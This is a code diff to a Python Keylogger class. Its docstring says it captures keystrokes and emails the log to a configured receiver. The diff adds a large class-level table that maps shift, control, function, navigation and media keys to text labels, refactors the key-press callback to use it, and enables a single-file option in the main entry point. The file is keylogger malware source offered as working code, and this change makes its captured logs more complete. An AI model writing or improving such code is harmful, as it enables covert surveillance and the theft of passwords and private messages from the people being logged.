@@ -27,6 +27,63 @@ class Keylogger:
             as the receiver of the email. If not specified emailReceiver will be equal to
             emailSender.        
     """
+    
+    specialKeys = {
+        Key.shift: "[SHIFT]",
+        Key.shift_l: "[SHIFT]",
+        Key.shift_r: "[SHIFT]",
+        Key.space: " ",
+        Key.enter: "[ENTER]\n",
+        Key.backspace: "[BACKSPACE]",
+        Key.alt: "[ALT]",
+        Key.alt_gr: "[ALT_GR]",
+        Key.alt_l: "[ALT_L]",
+        Key.alt_r: "[ALT_R]",
+        Key.caps_lock: "[CAPS_LOCK]",
+        Key.cmd: "[CMD]",
+        Key.cmd_l: "[CMD]",
+        Key.cmd_r: "[CMD]",
+        Key.ctrl: "[CTRL]",
+        Key.ctrl_l: "[CTRL]",
+        Key.ctrl_r: "[CTRL]",
+        Key.delete: "[CANC]",
+        Key.down: "[DOWN]",
+        Key.left: "[LEFT]",
+        Key.right: "[RIGHT]",
+        Key.up: "[UP]",
+        Key.end: "[END]",
+        Key.esc: "[ESC]",
+        Key.f1: "[F1]",
+        Key.f2: "[F2]",
+        Key.f3: "[F3]",
+        Key.f4: "[F4]",
+        Key.f5: "[F5]",
+        Key.f6: "[F6]",
+        Key.f7: "[F7]",
+        Key.f8: "[F8]",
+        Key.f9: "[F9]",
+        Key.f10: "[F10]",
+        Key.f11: "[F11]",
+        Key.f12: "[F12]",
+        Key.f13: "[F13]",
+        Key.f14: "[F14]",
+        Key.f15: "[F15]",
+        Key.f16: "[F16]",
+        Key.f17: "[F17]",
+        Key.f18: "[F18]",
+        Key.f19: "[F19]",
+        Key.f20: "[F20]",
+        Key.home: "[HOME]",
+        Key.insert: "[INSERT]",
+        Key.media_next: "[MEDIA_NEXT]",
+        Key.media_previous: "[MEDIA_PREVIOUS]",
+        Key.media_play_pause: "[MEDIA_PLAY_PAUSE]",
+        Key.media_volume_down: "[MEDIA_VOLUME_DOWN]",
+        Key.media_volume_mute: "[MEDIA_VOLUME_MUTE]",
+        Key.media_volume_up: "[MEDIA_VOLUME_UP]",
+        Key.menu: "[MENU]"
+    }
+    
     def __init__(
         self,
         interval : int = 60,
@@ -69,14 +126,9 @@ class Keylogger:
         """
             This callback is invoked whenever a keyboard event is occured
         """
-        specialKeys = {
-            Key.space: " ",
-            Key.enter: "[ENTER]\n",
-            Key.backspace: "[BACKSPACE]"
-        }
-
-        if key in specialKeys.keys():
-            self.log += specialKeys[key]
+        
+        if key in self.specialKeys.keys():
+            self.log += self.specialKeys[key]
         else:
             self.log += str(key).replace("'","")
 
@@ -163,5 +215,6 @@ class Keylogger:
 
 if __name__ == "__main__":
     Keylogger(
-        interval=5
+        interval=5,
+        onlyOneFile=True
     ).start()
